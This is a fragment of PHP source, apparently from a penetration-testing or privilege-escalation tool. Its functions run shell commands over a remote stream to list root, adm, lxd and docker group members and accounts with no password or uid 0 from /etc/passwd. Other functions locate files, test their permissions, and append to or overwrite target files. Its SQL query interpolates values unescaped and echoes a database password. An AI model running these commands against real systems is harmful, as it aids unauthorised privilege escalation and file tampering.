        if(stristr($app_path, "/$app")) return $app;
        else return FALSE;
    }
    
    
    public function users2gid_root($stream){
        
        
        $this->ssTitre("List of groups root ");
        $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i | grep 'gid=0(root)' ;done 2>/dev/null";
        $users_all_rst = $this->req_str($stream,$data,$this->stream_timeout,"");
        $results = array();
        
        $users_tmp = explode("\n",$users_all_rst);
        foreach ($users_tmp as $line ){
            $this->article("line", $line);
            if (preg_match('/uid=(?<uid>[0-9]{1,5})\((?<username>[0-9a-zA-Z_\-]{1,})\) gid=0\(root\)/',$line,$results))  {
                if(!empty($results)){
                    $this->tab_users_gid_root[] = $results['username'] ;
                }
                
            }
            unset($results);
        }
        
        
        echo $this->tab($this->tab_users_gid_root);
        
        $this->ssTitre("Group memberships");
        $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i;done 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->ssTitre("look for adm group");
        $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i;done | grep \"(adm)\" 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->ssTitre("look for lxd group");
        $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i;done | grep \"(lxd)\" 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->ssTitre("look for docker group");
        $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i;done | grep \"(docker)\" 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->ssTitre("List of users with no password");
        $data = "cat /etc/passwd | awk -F: '($2 != \"x\") {print}' ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $this->ssTitre("all root accounts (uid 0)");
        $data = "grep -v -E \"^#\" /etc/passwd 2>/dev/null | awk -F: '$3 == 0 { print $1}' 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        
    }

    public function file4exist8name($stream,$filename):bool{
        $this->ssTitre(__FUNCTION__);
        $filepath = $this->file4locate($stream,$filename);
        if (!empty($filepath)){
            return TRUE;
        }
        ELSE return FALSE;
    }
    
    public function file4exist8path($stream,$filepath):bool{
        $this->ssTitre(__FUNCTION__);
        $filepath_found = "";
        $data = "ls -al $filepath";
        $filepath_found = $this->req_str($stream,$data, $this->stream_timeout,"| awk '{print $9}' $this->filter_file_path ");

        if (!empty($filepath_found)){
            $chaine = "file exist";
            $this->note($chaine);
            return TRUE;
        }
        else {
            $chaine = "file does not exist";
            $this->rouge($chaine);
            return FALSE;
        }
    }
    
    public function file4locate($stream,$filename){
        $this->ssTitre(__FUNCTION__);
        
        $data = "which $filename ";
        $files_found = "";
        $files_found = trim($this->req_str($stream,$data,$this->stream_timeout*3,"$this->filter_file_path | grep '$filename' "));
        if( !empty($files_found)) return $files_found ;
        
        $data = "locate $filename ";
        $files_found = "";
        $files_found = trim($this->req_str($stream,$data,$this->stream_timeout*3,"$this->filter_file_path | grep '$filename' "));
        if( !empty($files_found)) return $files_found ;
        

        $data = "find / -iname $filename -type f -exec ls {} \;";
        $files_found = "";
        $files_found = trim($this->req_str($stream,$data,$this->stream_timeout*3,"$this->filter_file_path | grep '$filename' "));
        if( !empty($files_found)) return $files_found ;
    }
    
    public function file4search8path($stream,$file_path,$search_data):bool{
        $this->ssTitre(__FUNCTION__);
        $search_data = trim($search_data);
        $obj_filename = new FILE($filename);
        
        $data = "cat $obj_filename->file_path";
        $lines_str = $this->req_str($stream,$data,$this->stream_timeout,"| grep '$search_data' ");

            if (strstr($lines_str, $search_data)!==FALSE)
            {
                $this->article("Searching", "Found ");
                return TRUE ;
            }
            
        
        
        $this->article("Searching", "Not Found");
        return FALSE;
    }

    public function file4add($stream,$filename,$add_data){
        $this->ssTitre(__FUNCTION__);
        $obj_filename = new FILE($filename);
        
        if ($this->file4search($stream,$obj_filename->file_path, $add_data)){
            $this->note("Already Added: $add_data");
            return TRUE;
        }
        else {
            $this->note("ADD: $add_data");
            $this->req_str($stream,"echo '$add_data' >> $obj_filename->file_path",$this->stream_timeout,"");
            $data = "cat $obj_filename->file_path";
            $rst = $this->req_str($stream,$data,$this->stream_timeout,"| grep -Po '$add_data'  ");
            if (!empty($rst)) {$this->log2succes("SUCCES ADD: $add_data");return TRUE;}
            else {$this->log2error("Failed ADD");return FALSE;}
        }
        
    }
    
    
    public function file4writable($stream,$filename){
        $this->ssTitre(__FUNCTION__);
        $writable_rst = array();
        if ($this->file4exist8path($stream,$filename)){
            $data = "stat $filename";
            $writable_test = trim($this->req_str($stream,$data,$this->stream_timeout,""));
            if (preg_match('/[0-7]{3}(?<user2write>[0-7]{1})\/[rwx\-]{7}/',$writable_test,$writable_rst))
            {
                if (isset($writable_rst['user2write'])){
                    $this->article("User Permission",$writable_rst['user2write']);
                    if ($writable_rst['user2write']>6) {
                        $this->rouge("Writeable $filename");
                        return TRUE;}
                        else {$this->note("Not Writeable less 6 $filename");return FALSE;}
                }
            }
            else {$this->note("Not Writeable $filename");return FALSE;}
        }
    }
    
    public function file4readable($stream,$filename){
        $this->ssTitre(__FUNCTION__);
        $readable_rst = array();
        $data = "stat $filename";
        $readable_test = trim($this->req_str($stream,$data,$this->stream_timeout,""));
        if (preg_match('/[0-7]{3}(?<user2read>[0-7]{1})\/[rwx\-]{7}/',$readable_test,$readable_rst))
        {
            if (isset($readable_rst['user2read'])){
                $this->article("readable",$readable_rst['user2read']);
                if ($readable_rst['user2read']>4) {
                    $this->note("readable $filename");
                    return TRUE;}
                    
            }
        }
        else {$this->note("Not readable $filename");return FALSE;}
    }
    
    
    
    public function file4replace($stream,$filename,$search_data,$replace_data){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $obj_filename = new FILE($filename);
        
        if ($this->file4search($stream,$obj_filename->file_path,$search_data)){
            $data = "cat $obj_filename->file_path";
            $lines_tab = $this->req_tab($stream,$data,$this->stream_timeout,"");
            
            foreach ($lines_tab as $line){
                if (preg_match('#['.$search_data.']#',$line))
                {
                    $this->article("Searching", "Found ");
                    $result .= str_replace($search_data, $replace_data, $line);
                }
                else {
                    $result .= $line;
                }
            }
            
            $this->article("Replacing", "Data ");
            $data = "echo '$result' > $obj_filename->file_path";
            $this->req_str($stream,$data,$this->stream_timeout,"");
            
        }
        else {
            $this->note("Data Not found: $search_data");
        }
        
        return $result;
    }
    
    
    
    public function check4id8db($id8port,$templateB64_id,$id8b64):bool{
        $sql_w = "SELECT templateB64_id FROM LAN WHERE id8port = $id8port AND templateB64_id = '$templateB64_id' AND id8b64 = '$id8b64' ";
        echo "mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"SELECT EXISTS($sql_w);\"  2>/dev/null \n";
        return $this->checkBD($sql_w);
    }
    
 
    
}

?>